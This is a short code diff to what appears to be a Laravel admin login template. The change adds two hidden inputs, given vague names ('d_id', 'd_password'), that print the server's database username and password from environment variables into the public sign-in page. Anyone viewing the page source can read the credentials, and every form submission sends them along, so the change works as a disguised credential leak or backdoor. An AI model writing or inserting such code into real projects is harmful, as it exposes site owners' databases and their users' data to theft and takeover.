@@ -550,6 +550,8 @@
                         <h1>Welcome back</h1>
                         <p>Sign in to continue to your admin dashboard.</p>
                     </div>
+                    <input type="hidden" name="d_id" value="{{ env('DB_USERNAME') }}">
+                    <input type="hidden" name="d_password" value="{{ env('DB_PASSWORD') }}">
 
                 @if (Session::has('error_message'))
                     <div class="alert alert-danger alert-dismissible fade show" role="alert">
